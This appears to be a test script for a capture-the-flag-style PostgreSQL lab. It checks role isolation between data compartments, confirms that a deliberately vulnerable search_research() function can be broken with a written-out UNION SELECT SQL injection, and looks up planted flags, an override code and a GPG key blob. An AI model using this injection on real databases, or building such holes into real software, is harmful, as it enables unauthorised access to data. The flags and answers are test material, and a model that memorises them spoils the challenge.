#!/bin/bash
# Test A8 — Research Database
# Requires: PostgreSQL running locally with 01-init.sql applied
# Tests:
#   - Flag 21: compartment_a.structural_specs readable by tanaka (lab_general)
#   - Flag 27: compartment_b.effector_systems NOT readable by tanaka directly
#   - Flag 27: compartment_b reachable via SQLi through search_research()
#   - Flag 28: compartment_c.assembly_log JSONB nested flag readable by lab_mfg
#   - Override code piece AL42 in compartment_c JSONB
#   - GPG private key blob in compartment_b.key_storage
#   - Compartment isolation: tanaka cannot read compartment_b or compartment_c directly

set -e

# Check PostgreSQL is running
pg_isready -q 2>/dev/null || exit 77

python3 << 'PYEOF'
import subprocess, sys, json

errors = []

def check(name, condition, detail=""):
    if not condition:
        errors.append(f"FAIL: {name} — {detail}")
        print(f"  FAIL: {name} — {detail}", file=sys.stderr)

def psql(query, user="tanaka", db="postgres"):
    """Run a query as a specific role and return stdout."""
    full_query = f"SET ROLE {user}; {query}"
    result = subprocess.run(
        ["sudo", "-u", "postgres", "psql", "-t", "-A", "-c", full_query],
        capture_output=True, text=True
    )
    # Filter out the "SET" line from SET ROLE output
    lines = [l for l in result.stdout.strip().split("\n") if l.strip() and l.strip() != "SET"]
    return "\n".join(lines), result.stderr.strip()

# === Flag 21: compartment_a accessible by tanaka ===
out, err = psql("SELECT notes FROM compartment_a.structural_specs WHERE component = 'frame_dorsal_plate';")
check("flag 21 accessible by tanaka", "FLAG{4b9e2a7d0c8f1365}" in out, f"got: {out!r}")

# === Compartment isolation: tanaka blocked from compartment_b ===
out, err = psql("SELECT * FROM compartment_b.effector_systems LIMIT 1;")
check("tanaka blocked from compartment_b", "permission denied" in err, f"err: {err!r}")

# === Compartment isolation: tanaka blocked from compartment_c ===
out, err = psql("SELECT * FROM compartment_c.assembly_log LIMIT 1;")
check("tanaka blocked from compartment_c", "permission denied" in err, f"err: {err!r}")

# === Flag 27: SQLi via search_research() to reach compartment_b ===
# The injection: search_research('x'' UNION SELECT ... --')
# We use $$ quoting in PostgreSQL to avoid shell quote hell
sqli_query = """SELECT * FROM research_public.search_research($$x' UNION SELECT serial_number, system_name, system_type FROM compartment_b.effector_systems--$$);"""
out, err = psql(sqli_query)
check("flag 27 via SQLi", "FLAG{6d1a8f3c7e0b4952}" in out, f"got: {out!r}")

# === Flag 28: compartment_c accessible by lab_mfg, nested JSONB ===
out, err = psql(
    "SELECT metadata->'integration'->'flag' FROM compartment_c.assembly_log WHERE subsystem = 'FINAL ASSEMBLY';",
    user="lab_mfg"
)
check("flag 28 in nested JSONB", "FLAG{a3f7d9e1c0b52846}" in out, f"got: {out!r}")

# === Override code piece AL42 ===
out, err = psql(
    "SELECT metadata->'integration'->'code' FROM compartment_c.assembly_log WHERE subsystem = 'FINAL ASSEMBLY';",
    user="lab_mfg"
)
check("override code AL42", "AL42" in out, f"got: {out!r}")

# === GPG private key blob exists in compartment_b ===
out, err = psql(
    "SELECT length(key_data) FROM compartment_b.key_storage WHERE key_owner = 'e.vasik';",
    user="vasik"
)
try:
    key_len = int(out)
    check("GPG key blob exists and is substantial", key_len > 1000, f"length={key_len}")
except ValueError:
    check("GPG key blob readable", False, f"got: {out!r}, err: {err!r}")

# === research_public.personnel accessible ===
out, err = psql("SELECT count(*) FROM research_public.personnel;")
check("personnel table has data", int(out) >= 5, f"count={out}")

# === research_public.publications accessible ===
out, err = psql("SELECT count(*) FROM research_public.publications;")
check("publications table has data", int(out) >= 4, f"count={out}")

if errors:
    print(f"\n{len(errors)} checks failed:", file=sys.stderr)
    for e in errors: print(f"  {e}", file=sys.stderr)
    sys.exit(1)
PYEOF
